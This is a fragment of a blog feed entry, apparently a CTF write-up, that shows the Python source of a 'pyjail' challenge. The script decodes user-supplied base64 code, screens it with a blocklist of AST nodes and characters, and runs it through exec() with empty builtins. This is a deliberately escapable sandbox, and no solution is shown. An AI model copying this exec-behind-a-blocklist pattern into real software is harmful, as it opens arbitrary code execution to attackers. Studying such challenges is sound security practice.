class="line"><span class="comment"># FROM python:3.12.3-alpine</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line">BANNER = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">          .?77777777777777$.            </span></span><br><span class="line"><span class="string">          777..777777777777$+           </span></span><br><span class="line"><span class="string">         .77    7777777777$$$           </span></span><br><span class="line"><span class="string">         .777 .7777777777$$$$           </span></span><br><span class="line"><span class="string">         .7777777777777$$$$$$           </span></span><br><span class="line"><span class="string">         ..........:77$$$$$$$           </span></span><br><span class="line"><span class="string">  .77777777777777777$$$$$$$$$.=======.  </span></span><br><span class="line"><span class="string"> 777777777777777777$$$$$$$$$$.========  </span></span><br><span class="line"><span class="string">7777777777777777$$$$$$$$$$$$$.========= </span></span><br><span class="line"><span class="string">77777777777777$$$$$$$$$$$$$$$.========= </span></span><br><span class="line"><span class="string">777777777777$$$$$$$$$$$$$$$$ :========+.</span></span><br><span class="line"><span class="string">77777777777$$$$$$$$$$$$$$+..=========++~</span></span><br><span class="line"><span class="string">777777777$$..~=====================+++++</span></span><br><span class="line"><span class="string">77777777$~.~~~~=~=================+++++.</span></span><br><span class="line"><span class="string">777777$$$.~~~===================+++++++.</span></span><br><span class="line"><span class="string">77777$$$$.~~==================++++++++: </span></span><br><span class="line"><span class="string"> 7$$$$$$$.==================++++++++++. </span></span><br><span class="line"><span class="string"> .,$$$$$$.================++++++++++~.  </span></span><br><span class="line"><span class="string">         .=========~.........           </span></span><br><span class="line"><span class="string">         .=============++++++           </span></span><br><span class="line"><span class="string">         .===========+++..+++           </span></span><br><span class="line"><span class="string">         .==========+++.  .++           </span></span><br><span class="line"><span class="string">          ,=======++++++,,++,           </span></span><br><span class="line"><span class="string">          ..=====+++++++++=.            </span></span><br><span class="line"><span class="string">                ..~+=...     </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># Enough ?</span></span><br><span class="line">FORBIDDEN_AST = [</span><br><span class="line">    ast.Import,</span><br><span class="line">    ast.ImportFrom,</span><br><span class="line">    ast.ClassDef,</span><br><span class="line">    ast.FunctionDef,</span><br><span class="line">    ast.Assign,</span><br><span class="line">    ast.Eq,</span><br><span class="line">    ast.Add,</span><br><span class="line">    ast.Mult,</span><br><span class="line">    ast.Mod,</span><br><span class="line">    ast.Assert,</span><br><span class="line">    ast.Compare,</span><br><span class="line">    ast.AugAssign,</span><br><span class="line">    ast.AnnAssign,</span><br><span class="line">    ast.Call,</span><br><span class="line">]</span><br><span class="line">FORBIDDEN_PATTERNS = [<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;class&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(c) &gt; <span class="number">0x100</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Code too long&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> FORBIDDEN_PATTERNS:</span><br><span class="line">        <span class="keyword">if</span> ch <span class="keyword">in</span> c:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Forbidden pattern found&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        code.encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Invalid encoding&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c = ast.parse(c, <span class="string">&#x27;&lt;CNSS&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Syntax error&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ast.walk(c):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(i) <span class="keyword">in</span> FORBIDDEN_AST:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Forbidden operation found&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(BANNER)</span><br><span class="line">code = <span class="built_in">input</span>(<span class="string">&#x27;Enter base64 encoded code: &#x27;</span>)</span><br><span class="line">code = base64.b64decode(code.strip()).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">check(code)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    code = <span class="built_in">compile</span>(code, <span class="string">&#x27;&lt;CNSS&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    <span class="built_in">exec</span>(code, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;&#125;)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>无后续++</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#web&quot;&gt;&lt;/a&gt; Web&lt;/h1&gt;
&lt;h2 id=&quot;babyhttp&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#babyhttp&quot;&gt;&lt;/a&gt; 🦴 </summary>
      
    
    
    
    
  </entry>
  
</feed>
